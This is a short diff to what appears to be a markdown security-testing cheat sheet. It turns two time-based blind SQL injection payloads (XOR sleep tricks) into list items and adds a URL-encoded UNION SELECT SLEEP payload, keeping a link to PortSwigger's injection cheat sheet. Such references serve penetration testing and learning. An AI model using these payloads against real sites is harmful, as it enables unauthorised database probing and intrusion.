@@ -46,9 +46,11 @@
   ```
 - **Sleep Payload**:
   ```bash
-  0’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
-  63770’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
+  - 0’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
+  - 63770’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
+  - a%3C%22+UNION+SELECT+SLEEP(20);--+-
   ```
+  
 - **PortSwigger SQL Injection Cheat Sheet**:
   ```bash
   https://portswigger.net/web-security/sql-injection/cheat-sheet
